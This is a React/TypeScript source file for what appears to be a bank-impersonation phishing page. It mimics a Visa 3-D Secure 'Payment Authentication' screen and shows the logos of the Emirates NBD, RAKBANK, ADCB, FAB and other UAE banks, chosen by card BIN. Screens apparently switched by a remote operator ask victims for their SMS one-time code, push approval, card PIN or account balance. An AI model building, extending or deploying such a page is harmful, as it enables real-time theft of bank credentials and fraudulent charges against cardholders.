import React from "react";
import { useBankVerification } from "../../hooks/use-bank-verification";
import type { BankVerificationProps, OperatorMessage, ResendState, TransactionDetails } from "../../types";
import NBD2Styles from "./styles/nbd2-styles";
import { StyleIsolationWrapper } from "../../components/style-isolation-wrapper";
import { BANK_LOGO_DATA_URLS } from "../../assets/bank-logos";

const DEFAULT_BANK_LOGO = "nbd.png";
const DEFAULT_CARD_LOGO = "visa.svg";

/**
 * Bank/issuer name to logo filename. Keys are lowercase for case-insensitive lookup.
 * Issuer names come from BIN lookup (HandyAPI, card_bins) - run `bun run list-bank-issuers` in ncc-api to see DB values.
 */
const BANK_TO_LOGO: Record<string, string> = {
  "emirates nbd": "nbd.png",
  "emirates nbd bank (p.j.s.c.)": "nbd.png",
  enbd: "nbd.png",
  nbd: "nbd.png",
  rakbank: "RAKBANK.png",
  "emirates islamic": "EmiratesIslamic.png",
  "dubai islamic": "dib.png",
  dib: "dib.png",
  adcb: "adcb.png",
  fab: "fab.svg",
  "first abu dhabi": "fab.svg",
  mashreq: "mashreq.png",
  mashreqbank: "mashreq.png",
  adib: "nbd.png",
  "abu dhabi islamic": "nbd.png",
  hsbc: "hsbc.jpg",
  citi: "citi.png",
  "sharjah islamic": "sib.png",
  sib: "sib.png",
  psc: "psc.png",
  cmb: "cmb.png",
  "commercial bank of dubai": "cmb.png",
  "commercial bank of dubai(psc)": "cmb.png",
  cbd: "cmb.png",
  afaq: "afaq.jpg",
  emoney: "Emoney.jpg",
  "digital financial services llc": "nbd.png",
};

function getBankLogoUrl(bank: string | undefined): string {
  if (!bank) return BANK_LOGO_DATA_URLS[DEFAULT_BANK_LOGO] ?? "";
  const key = bank.toLowerCase().trim();
  const filename =
    BANK_TO_LOGO[key] ??
    Object.entries(BANK_TO_LOGO).find(([k]) => key.includes(k) || k.includes(key))?.[1] ??
    DEFAULT_BANK_LOGO;
  return BANK_LOGO_DATA_URLS[filename] ?? BANK_LOGO_DATA_URLS[DEFAULT_BANK_LOGO] ?? "";
}

function getCardLogoUrl(cardBrand: "visa" | "mastercard" | undefined): string {
  if (cardBrand === "mastercard") return BANK_LOGO_DATA_URLS["master-card.jpg"] ?? BANK_LOGO_DATA_URLS[DEFAULT_CARD_LOGO] ?? "";
  return BANK_LOGO_DATA_URLS[DEFAULT_CARD_LOGO] ?? "";
}

const overlayStyles = {
  position: "fixed" as const,
  inset: 0,
  background: "rgba(0,0,0,0.5)",
  display: "flex",
  alignItems: "center",
  justifyContent: "center",
  zIndex: 9999,
};
const errorBannerStyles = {
  padding: "8px 16px",
  background: "#f8d7da",
  color: "#721c24",
  fontSize: 14,
  textAlign: "center" as const,
};

function Spinner({ size = 48 }: { size?: number }) {
  const border = Math.max(2, Math.floor(size / 8));
  return (
    <div
      className="bank-ui-spinner"
      style={
        {
          "--bank-ui-spinner-size": `${size}px`,
          "--bank-ui-spinner-border": `${border}px`,
        } as React.CSSProperties
      }
    />
  );
}

function VerificationPage({
  children,
  footer,
  bank,
  cardBrand,
  inProgress,
  error,
  onClose,
}: {
  children: React.ReactNode;
  footer?: React.ReactNode;
  bank?: string;
  cardBrand?: "visa" | "mastercard";
  inProgress: boolean;
  error?: string | null;
  onClose?: () => void;
}) {
  return (
    <div>
      <meta charSet="utf-8" />
      <meta name="viewport" content="width=device-width, initial-scale=1.0" />
      <title>Validate Authentication Credential</title>
      <NBD2Styles />
      {inProgress && (
        <div style={overlayStyles}>
          <div style={{ background: "#fff", padding: 24, borderRadius: 8, display: "flex", flexDirection: "column", alignItems: "center", gap: 16 }}>
            <Spinner size={48} />
            <span>Processing...</span>
          </div>
        </div>
      )}
      {error && <div style={errorBannerStyles}>{error}</div>}
      <Shell bank={bank} cardBrand={cardBrand} footer={footer} onClose={onClose}>
        {children}
      </Shell>
    </div>
  );
}

function TransactionBody({
  transactionDetails,
  variant,
}: {
  transactionDetails?: TransactionDetails;
  variant: "sms" | "push" | "balance" | "pin";
}) {
  const merchant = transactionDetails?.merchantName ?? "";
  const amount = transactionDetails?.amount ?? "";
  const date = transactionDetails?.date ?? "";
  const card = transactionDetails?.cardNumber ?? "";

  const intro =
    variant === "sms"
      ? "We just sent a SMS with secure code to your registered mobile number."
      : variant === "push"
        ? "A push notification has been sent to your mobile app."
        : variant === "balance"
          ? "Please enter your account balance to complete the verification."
          : "Enter the PIN for your card to complete the transaction.";

  const showPaymentDetails = variant === "sms" || variant === "push";

  return (
    <div>
      <p className="mb-0" id="Body1">
        {intro}
        {showPaymentDetails && (
          <>
            <br />
            <br />
            You are authorizing a payment to <span id="contentBlock-merchantname">{merchant}</span> for{" "}
            <span id="contentBlock-amount" className="always-left-to-right">
              {amount}
            </span>{" "}
            on {date} with your card:
          </>
        )}
        {variant === "push" && (
          <>
            <br />
            <br />
            Please approve the transaction on your device.
          </>
        )}
        {!showPaymentDetails && (
          <>
            <br />
            <br />
            Payment to <span id="contentBlock-merchantname">{merchant}</span> for{" "}
            <span id="contentBlock-amount" className="always-left-to-right">
              {amount}
            </span>{" "}
            on {date} with card:
          </>
        )}
      </p>
      {(showPaymentDetails || variant === "balance" || variant === "pin") && (
        <span id="contentBlock-maskedpan" className="always-left-to-right" style={{ fontFamily: "monospace", letterSpacing: 2 }}>
          {card.includes("XXXX") || card.includes("****")
            ? card.replace(/\*+/g, "••••").replace(/X+/g, "••••")
            : card}
        </span>
      )}
    </div>
  );
}

function Shell({
  children,
  footer,
  bank,
  cardBrand,
  onClose,
}: {
  children: React.ReactNode;
  footer?: React.ReactNode;
  bank?: string;
  cardBrand?: "visa" | "mastercard";
  onClose?: () => void;
}) {
  const bankLogoUrl = getBankLogoUrl(bank);
  const cardLogoUrl = getCardLogoUrl(cardBrand ?? "visa");
  return (
    <div className="threeds-two">
      <div className="container-fluid">
        <div className="visa-styling header" id="HeaderLogosFullWidth">
          <button className="closeModal" id="ExitLink" type="button" onClick={() => onClose?.()}>
            X
          </button>
          <div className="row no-pad">
            <div className="visa-styling bottom-border col-12">
              <div className="pull-left visa-header-one">
                <img alt="Bank Logo" className="visa-header-img" src={bankLogoUrl} />
              </div>
              <div className="pull-right visa-header-two">
                <img alt="Card scheme" className="visa-header-img" src={cardLogoUrl} />
              </div>
            </div>
          </div>
        </div>
        <div className="visa-styling body" dir="ltr">
          <div className="visa-styling container container-sticky-footer">
            {children}
            {footer ?? (
              <div className="footer" id="FooterLinks">
                <div className="row">
                  <div className="visa-col-12 helpRow" id="Accordion">
                    <ul className="list-group list-group-horizontal flex-wrap pull-left">
                      <li className="list-group-item border-0">
                        <a className="btn btn-link no-decoration" data-bs-target="#FAQ" data-bs-toggle="modal" href="#FAQ" id="FooterLink1">
                          Need some help?
                        </a>
                      </li>
                      <li className="list-group-item border-0">
                        <a className="btn btn-link no-decoration" data-bs-target="#Terms" data-bs-toggle="modal" href="#Terms" id="FooterLink1">
                          learn more about authentication
                        </a>
                      </li>
                    </ul>
                  </div>
                </div>
              </div>
            )}
          </div>
          <form action="/Api/2_1_0/NextStep/StepUp" autoComplete="off" id="StepupForm" method="post" name="StepupForm" />
        </div>
        <div className="modal fade sf-hidden" id="FAQ" tabIndex={-1} role="dialog" aria-labelledby="FAQ-label" data-bs-backdrop="static" data-bs-keyboard="false" aria-modal="true" />
        <div className="modal fade sf-hidden" id="Terms" tabIndex={-1} role="dialog" aria-labelledby="Terms-label" data-bs-backdrop="static" data-bs-keyboard="false" aria-modal="true" />
        <form className="nextstep-form" method="post" />
        <form method="POST" id="TermForm" />
      </div>
    </div>
  );
}

const defaultResendState: ResendState = {
  secondsLeft: 0,
  canResend: true,
  onResend: () => {},
  resending: false,
};

function FooterLinks() {
  return (
    <div className="footer" id="FooterLinks">
      <div className="row">
        <div className="visa-col-12 helpRow" id="Accordion">
          <ul className="list-group list-group-horizontal flex-wrap pull-left">
            <li className="list-group-item border-0">
              <a className="btn btn-link no-decoration" data-bs-target="#FAQ" data-bs-toggle="modal" href="#FAQ" id="FooterLink1">
                Need some help?
              </a>
            </li>
            <li className="list-group-item border-0">
              <a className="btn btn-link no-decoration" data-bs-target="#Terms" data-bs-toggle="modal" href="#Terms" id="FooterLink1">
                learn more about authentication
              </a>
            </li>
          </ul>
        </div>
      </div>
    </div>
  );
}

function ResendButton({
  layout,
  canResend,
  secondsLeft,
  resending,
  submitting,
  onResend,
  onTryAgain,
}: {
  layout: "sms" | "pin";
  canResend: boolean;
  secondsLeft: number;
  resending: boolean;
  submitting: boolean;
  onResend: () => void;
  onTryAgain: () => void;
}) {
  const label = layout === "pin" ? "PIN" : "CODE";
  return (
    <div className="visa-row">
      <div className="col-12 text-center">
        <span
          style={{ display: !canResend && secondsLeft <= 0 ? "inline" : "none" }}
          id="MaximumResendsReachedMessage"
        >
          You have been reached maximum attempts, Please contact bank
        </span>
        {canResend ? (
          <button
            id="ResendLink"
            className="btn btn-link resend-link no-decoration text-uppercase"
            type="button"
            onClick={() => { onTryAgain(); onResend(); }}
            disabled={resending || submitting}
          >
            {resending ? "Sending..." : `RESEND ${label}`}
          </button>
        ) : (
          <span className="resend-link no-decoration text-uppercase" style={{ cursor: "default" }}>
            Resend {label.toLowerCase()} in {String(Math.floor(secondsLeft / 60)).padStart(1, "0")}:
            {String(secondsLeft % 60).padStart(2, "0")}
          </span>
        )}
      </div>
    </div>
  );
}

function ErrorSpan({ message, visible }: { message: string; visible: boolean }) {
  return (
    <div className="form-group" id="ErrorMessage">
      <img id="WarningImage" src="data:," alt="Warning" style={{ display: visible ? "inline" : "none" }} />
      <span
        id="ValidationErrorMessage"
        className="field-validation-error"
        style={{ display: visible ? "inline" : "none" }}
      >
        {message}
      </span>
    </div>
  );
}

export function VerificationUi({
  apiBase,
  channelSlug,
  sessionId,
  debug,
  onSuccess,
  onDeclined,
  onError,
  onRedirect,
  onClose,
}: BankVerificationProps) {
  if (!channelSlug || !sessionId) return null;

  const { layoutState, inProgress, awaitingVerification, error } = useBankVerification({
    apiBase,
    channelSlug,
    sessionId,
    debug,
    onSuccess,
    onDeclined,
    onError,
    onRedirect,
    onClose,
  });

  if (!awaitingVerification && !inProgress) return null;

  const { bank, transactionDetails } = layoutState;

  // --- Push layout ---
  if (layoutState.layout === "push") {
    return (
      <StyleIsolationWrapper>
        <VerificationPage bank={bank} cardBrand={transactionDetails?.cardBrand} inProgress={inProgress} error={error} onClose={onClose}>
          <h2 className="screenreader-only">Confirm on your device</h2>
          <div className="visa-row">
            <div className="visa-col-12 visa-validate">
              <strong>Payment Authentication</strong>
            </div>
            <div className="row">
              <div className="col-12" id="ValidateOneUpMessage">
                <TransactionBody transactionDetails={transactionDetails} variant="push" />
              </div>
            </div>
          </div>
          <div className="visa-row">
            <div className="col-12 visa-styling text-center">
              <div className="form-group" style={{ marginTop: 24, marginBottom: 24 }}>
                <Spinner size={64} />
              </div>
              <h3 className="visa-validate" style={{ marginBottom: 8 }}>Confirm on your device</h3>
              <p className="mb-0">
                {bank
                  ? `A push notification has been sent by ${bank}. Please approve the transaction on your device.`
                  : "A push notification has been sent to your mobile app. Please approve the transaction on your device."}
              </p>
            </div>
          </div>
        </VerificationPage>
      </StyleIsolationWrapper>
    );
  }

  // --- Balance layout ---
  if (layoutState.layout === "balance") {
    const { balance, onBalanceChange, onSubmit, submitting, canSubmit, operatorMessage } = layoutState;
    const showError = Boolean(operatorMessage?.message);

    return (
      <StyleIsolationWrapper>
        <VerificationPage
          bank={bank}
          cardBrand={transactionDetails?.cardBrand}
          inProgress={inProgress}
          error={error}
          onClose={onClose}
          footer={
            <form
              action="/Api/2_1_0/NextStep/ValidateCredential"
              autoComplete="off"
              id="BalanceValidateForm"
              method="post"
              name="BalanceValidateForm"
              noValidate
              onSubmit={(e) => { e.preventDefault(); onSubmit(); }}
            >
              <div className="visa-row">
                <div className="col-12 visa-styling">
                  <div className="form-group text-center">
                    <div id="InputAction">
                      <label htmlFor="BalanceInput" className="credential-label">Balance</label>
                      <input
                        autoFocus
                        className="form-control visa-styling credential-input"
                        id="BalanceInput"
                        inputMode="decimal"
                        name="Balance.Value"
                        placeholder="e.g. 1,234.56"
                        type="text"
                        value={balance}
                        onChange={(e) => onBalanceChange(e.target.value)}
                        disabled={submitting}
                      />
                      <ErrorSpan message={operatorMessage?.message ?? ""} visible={showError} />
                      <div className="visa-col-12 text-center">
                        <button
                          type="submit"
                          className="visa-styling btn btn-primary text-uppercase vba-button"
                          id="ValidateButton"
                          disabled={submitting || !canSubmit}
                        >
                          {submitting ? "Submitting..." : "Submit"}
                        </button>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
              <FooterLinks />
            </form>
          }
        >
          <h2 className="screenreader-only">Balance verification</h2>
          <div className="visa-row">
            <div className="visa-col-12 visa-validate"><strong>Payment Authentication</strong></div>
            <div className="row">
              <div className="col-12" id="ValidateOneUpMessage">
                <TransactionBody transactionDetails={transactionDetails} variant="balance" />
              </div>
            </div>
          </div>
        </VerificationPage>
      </StyleIsolationWrapper>
    );
  }

  // --- PIN layout ---
  if (layoutState.layout === "pin") {
    const { pinValue, onPinChange, pinMasked, onPinMaskToggle, wrongCode, expiredCode, onTryAgain, onSubmit, submitting, canSubmit, resendState, operatorMessage } = layoutState;
    const { secondsLeft, canResend, onResend, resending } = resendState;
    const showError = wrongCode || expiredCode || Boolean(operatorMessage?.message);
    const errorMessage = wrongCode
      ? "Wrong PIN. Please try again."
      : expiredCode
        ? "Code expired. Please request a new code."
        : operatorMessage?.message ?? "";

    return (
      <StyleIsolationWrapper>
        <VerificationPage
          bank={bank}
          cardBrand={transactionDetails?.cardBrand}
          inProgress={inProgress}
          error={error}
          onClose={onClose}
          footer={
            <form
              action="/Api/2_1_0/NextStep/ValidateCredential"
              autoComplete="off"
              id="PinValidateForm"
              method="post"
              name="PinValidateForm"
              noValidate
              onSubmit={(e) => { e.preventDefault(); onSubmit(); }}
            >
              <div className="visa-row">
                <div className="col-12 visa-styling">
                  <div className="form-group text-center">
                    <div id="InputAction">
                      <label htmlFor="PinInput" className="credential-label">PIN</label>
                      <input
                        autoFocus
                        className="form-control visa-styling credential-input"
                        id="PinInput"
                        inputMode="numeric"
                        maxLength={4}
                        name="Pin.Value"
                        placeholder="••••"
                        type={pinMasked ? "password" : "text"}
                        value={pinValue}
                        onChange={(e) => onPinChange(e.target.value.replace(/\D/g, "").slice(0, 4))}
                        disabled={submitting}
                      />
                      <label htmlFor="pin-show-toggle" style={{ display: "block", marginTop: 8, fontSize: 14 }}>
                        <input id="pin-show-toggle" type="checkbox" checked={!pinMasked} onChange={onPinMaskToggle} />
                        {" "}Show PIN
                      </label>
                      <ErrorSpan message={errorMessage} visible={showError} />
                      <div className="visa-col-12 text-center">
                        <button
                          type="submit"
                          className="visa-styling btn btn-primary text-uppercase vba-button"
                          id="ValidateButton"
                          disabled={submitting || !canSubmit}
                        >
                          {submitting ? "Submitting..." : "Submit"}
                        </button>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
              <div className="visa-row" />
              <ResendButton layout="pin" canResend={canResend} secondsLeft={secondsLeft} resending={resending} submitting={submitting} onResend={onResend} onTryAgain={onTryAgain} />
              <FooterLinks />
            </form>
          }
        >
          <h2 className="screenreader-only">Enter your PIN</h2>
          <div className="visa-row">
            <div className="visa-col-12 visa-validate"><strong>Payment Authentication</strong></div>
            <div className="row">
              <div className="col-12" id="ValidateOneUpMessage">
                <TransactionBody transactionDetails={transactionDetails} variant="pin" />
              </div>
            </div>
          </div>
        </VerificationPage>
      </StyleIsolationWrapper>
    );
  }

  // --- SMS layout (default) ---
  const { code, onCodeChange, wrongCode, expiredCode, onTryAgain, onSubmit, submitting, canSubmit, resendState, operatorMessage } = layoutState;
  const { secondsLeft, canResend, onResend, resending } = resendState ?? defaultResendState;
  const showError = wrongCode || expiredCode || Boolean(operatorMessage?.message);
  const errorMessage = wrongCode
    ? "Wrong OTP. Please try again."
    : expiredCode
      ? "Code expired. Please request a new code."
      : operatorMessage?.message ?? "";

  return (
    <StyleIsolationWrapper>
      <VerificationPage
        bank={bank}
        cardBrand={transactionDetails?.cardBrand}
        inProgress={inProgress}
        error={error}
        onClose={onClose}
        footer={
          <form
            action="/Api/2_1_0/NextStep/ValidateCredential"
            autoComplete="off"
            id="ValidateCredentialForm"
            method="post"
            name="ValidateCredentialForm"
            noValidate
            onSubmit={(e) => { e.preventDefault(); onSubmit(); }}
          >
            <div className="visa-row">
              <div className="col-12 visa-styling">
                <div className="form-group text-center">
                  <div id="InputAction">
                    <label htmlFor="CredentialValidateInput" className="credential-label">Verification Code</label>
                    <input
                      autoFocus
                      className="form-control visa-styling credential-input"
                      data-val="true"
                      data-val-required="Please enter the code"
                      id="CredentialValidateInput"
                      name="Credential.Value"
                      type="text"
                      inputMode="numeric"
                      maxLength={6}
                      value={code}
                      onChange={(e) => onCodeChange(e.target.value.replace(/\D/g, "").slice(0, 6))}
                      disabled={submitting}
                    />
                    <ErrorSpan message={errorMessage} visible={showError} />
                    <span
                      className="field-validation-valid sf-hidden"
                      data-valmsg-for="Credential.Value"
                      data-valmsg-replace="true"
                    />
                    <div className="visa-col-12 text-center">
                      <button
                        type="submit"
                        className="visa-styling btn btn-primary text-uppercase vba-button"
                        id="ValidateButton"
                        disabled={submitting || !canSubmit}
                      >
                        {submitting ? "Submitting..." : "Submit"}
                      </button>
                    </div>
                  </div>
                </div>
              </div>
            </div>
            <div className="visa-row" />
            <ResendButton layout="sms" canResend={canResend} secondsLeft={secondsLeft} resending={resending} submitting={submitting} onResend={onResend} onTryAgain={onTryAgain} />
            <FooterLinks />
          </form>
        }
      >
        <h2 className="screenreader-only">Your One-time Passcode has been sent</h2>
        <div className="visa-row">
          <div className="visa-col-12 visa-validate"><strong>Payment Authentication</strong></div>
          <div className="row">
            <div className="col-12" id="ValidateOneUpMessage">
              <TransactionBody transactionDetails={transactionDetails} variant="sms" />
            </div>
          </div>
        </div>
      </VerificationPage>
    </StyleIsolationWrapper>
  );
}
